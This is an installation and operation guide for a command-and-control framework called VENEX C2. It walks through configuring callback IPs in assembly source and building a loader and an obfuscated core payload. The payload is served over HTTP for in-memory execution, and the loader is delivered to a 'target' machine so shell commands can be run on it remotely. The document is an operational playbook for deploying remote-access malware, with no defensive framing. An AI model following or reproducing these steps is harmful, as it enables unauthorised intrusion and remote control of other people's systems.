# VENEX C2 v0.5 Installation Guide

This guide provides step-by-step instructions to set up and build the VENEX C2 project. The setup requires both a Windows environment for building most components and a Linux environment (e.g., WSL) for linking the final loader ELF binary.

## Prerequisites

- **Windows Environment**:
  - Download and install MinGW-w64 from [winlibs.com](https://winlibs.com/).
  - Extract the MinGW-w64 package. The `mingw64/bin/` directory contains the necessary tools (e.g., `mingw32-make.exe`) for compiling and assembling the project.
- **Linux Environment**:
  - Use WSL (Windows Subsystem for Linux), Ubuntu, Kali, or another Linux distribution.
  - Ensure the `ld` (GNU linker) tool is installed (it is included by default in most Linux distributions).
- **Python 3**:
  - Install Python 3 on Windows environment for running the HTTP server and client GUI.

## Build Instructions

### Step 1: Configure IP Addresses in Source Code
1. **Edit `core.asm`**:
   - Navigate to `gostInit/core/core.asm`.
   - Update the IP address constants at the top of the file. For example, for `127.0.0.1`:
     ```nasm
     IP1 equ 127
     IP2 equ 0
     IP3 equ 0
     IP4 equ -126  ; Calculate as IP4 = IP4 - IP1
     ```
   - Save the file.
2. **Edit `loader.asm`**:
   - Navigate to `gostInit/loader/loader.asm`.
   - Update the IP address and port at the top to match your server (e.g., `127.0.0.1:5000`).
   - Save the file.

### Step 2: Build the Project (Windows)
1. Open a windows terminal in the project root directory.
2. Run the following command to build the project:
   ```bash
   mingw64/bin/mingw32-make.exe all
   ```
3. The build process will create a `bin/` directory with the following structure:
   ```
   bin/
   ├── gostInit/
   │   ├── core.bin
   │   ├── droper.sh
   │   ├── loader.o
   ├── modules/
   │   ├── x.bin
   ├── server/
   │   ├── server.exe
   ├── tools/
   │   ├── encrypt.exe
   │   ├── encrypt.obj
   │   ├── hash.exe
   │   ├── obufcater.exe
   ```

### Step 3: Obfuscate `core.bin` (Windows)
Obfuscation is critical to prevent `core.bin` from crashing on the target system.
1. Navigate to `bin/tools/`.
2. Run the obfuscation command:
   ```bash
   ./obufcater.exe ../gostInit/core.bin
   ```
3. This will obfuscate `core.bin` in the `bin/gostInit/` directory.

### Step 4: Link the Loader (Linux)
The `loader.o` file in `bin/gostInit/` must be linked in a Linux environment to create the final ELF binary.
1. Open a terminal in WSL, Ubuntu, Kali, or another Linux distribution.
2. Navigate to the project root directory.
3. Run the following command to link `loader.o` (ignore warning):
   ```bash
   ld -N bin/gostInit/loader.o -o bin/gostInit/loader
   ```
4. This generates an ELF64 binary (`loader`) in `bin/gostInit/`, which can be executed on a Linux target.

## Usage Instructions

### Step 1: Start the C2 Server (Windows)
1. Navigate to `bin/server/`.
2. Run the server:
   ```bash
   ./server.exe
   ```
3. If prompted, allow public network access. The server will run on `0.0.0.0:7777`.

### Step 2: Start the HTTP Server (Windows or Linux)
The loader fetches `core.bin` from an HTTP server for in-memory execution.
1. Navigate to `bin/gostInit/`.
2. Start a simple HTTP server:
   ```bash
   python3 -m http.server 5000 --bind 0.0.0.0
   ```
   - Ensure Python 3 is installed.
   - The port (5000) must match the port specified in `loader.asm`. Adjust if necessary before building.

### Step 3: Start the C2 Client (Windows)
1. Navigate to `bin/C2Client/`.
2. Run the client:
   ```bash
   python3 client.py
   ```
3. A Tkinter-based GUI will appear.
4. In the GUI:
   - Enter the server IP (e.g., `127.0.0.1` for localhost) and port (e.g., `7777`).
   - Click **Connect**. A "connected" message will appear in the text box on the right.
5. Send the following command to create a listener on the server:
   ```
   AUTH:START_HTTP
   ```

### Step 4: Deploy the Loader on the Target (Linux)
1. Deliver the `loader` binary (from `bin/gostInit/`) to the target Linux machine (e.g., a Linux VM).
2. Ensure the target can connect to your server IP and port.
3. Execute the `loader` binary on the target. After a few seconds, the target should appear in the C2 client GUI.

### Step 5: Interact with the Target
1. In the C2 client GUI, right-click the target and select **Interact**.
2. You can now send commands to the target. The only supported module in v0.5 is `x`, which executes shell commands.
3. Example commands:
   ```bash
   x whoami
   x ls
   x ls -la
   x pwd
   ```
4. Command results will appear in the GUI after a few seconds.

## Notes
- Ensure the target machine can reach the HTTP server (`0.0.0.0:5000`) and the C2 server (`0.0.0.0:7777`).
- The `x` module executes shell commands on the target. Use the format `x <shell_command>` for commands.
- If you encounter issues, verify that:
  - The IP addresses and ports in `core.asm` and `loader.asm` are correct.
  - All required tools (`mingw32-make`, `ld`, Python 3) are installed.
  - The `core.bin` file is obfuscated before deployment.